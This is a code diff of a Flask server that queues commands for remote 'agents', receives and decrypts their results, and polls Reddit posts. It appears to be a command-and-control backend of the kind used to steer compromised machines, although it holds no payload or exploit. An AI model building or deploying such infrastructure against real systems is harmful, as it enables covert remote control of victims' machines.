@@ -78,25 +78,6 @@ def heartbeat():
     return jsonify({"agent_id": agent_id, "commands": cmd_list})
 
 
-@app.route("/result", methods=["POST"])
-def result():
-    data = request.get_json()
-    cmd_id = data.get("command_id")
-    output = data.get("result")
-
-    if not cmd_id or output is None:
-        return jsonify({"error": "command_id and result required"}), 400
-
-    command = Command.query.get(cmd_id)
-    if command:
-        command.status = "Completed"
-        command.result = decrypt(output)
-        command.completed_at = datetime.now(timezone.utc)
-        db.session.commit()
-
-    return jsonify({"status": "result stored", "command_id": cmd_id})
-
-
 @app.route("/queue", methods=["POST"])
 def queue_command():
     data = request.get_json()
@@ -118,18 +99,24 @@ def queue_command():
         "command_id": new_cmd.id
     })
 
-@app.route("/tasks/<status>", methods=["GET"])
-def get_tasks():
+
+@app.route("/result", methods=["POST"])
+def result():
     data = request.get_json()
+    cmd_id = data.get("command_id")
+    output = data.get("result")
 
-    
+    if not cmd_id or output is None:
+        return jsonify({"error": "command_id and result required"}), 400
 
-@app.route("/processed/<post_id>", methods=["GET"])
-def check_processed(post_id):
-    exists = ProcessedPost.query.get(post_id)
-    if exists:
-        return jsonify({"status": "processed", "post_id": post_id}), 200
-    return jsonify({"status": "not_found"}), 404
+    command = Command.query.get(cmd_id)
+    if command:
+        command.status = "Completed"
+        command.result = decrypt(output)
+        command.completed_at = datetime.now(timezone.utc)
+        db.session.commit()
+
+    return jsonify({"status": "result stored", "command_id": cmd_id})
 
 
 @app.route("/processed", methods=["POST"])
@@ -145,6 +132,14 @@ def mark_processed():
         db.session.commit()
 
     return jsonify({"status": "ok", "post_id": post_id})
+
+
+@app.route("/processed/<post_id>", methods=["GET"])
+def check_processed(post_id):
+    exists = ProcessedPost.query.get(post_id)
+    if exists:
+        return jsonify({"status": "processed", "post_id": post_id}), 200
+    return jsonify({"status": "not_found"}), 404
 
 
 @app.route("/agents", methods=["GET"])
@@ -184,6 +179,22 @@ def get_agents_commands(id):
         "Last Seen": agent.last_seen.isoformat() if agent.last_seen else None,
         "Commands": cmd_list
     })
+
+
+@app.route("/tasks/<status>", methods=["GET"])
+def get_tasks(status):
+    cmds = Command.query.filter_by(status=status.capitalize()).all()
+    return jsonify([
+        {
+            "Command Id": c.id,
+            "Agent Id": c.agent_id,
+            "Command": c.command,
+            "Status": c.status,
+            "Result": c.result
+        }
+        for c in cmds
+    ])
+
 
 def poll_reddit():
     reddit = praw.Reddit(
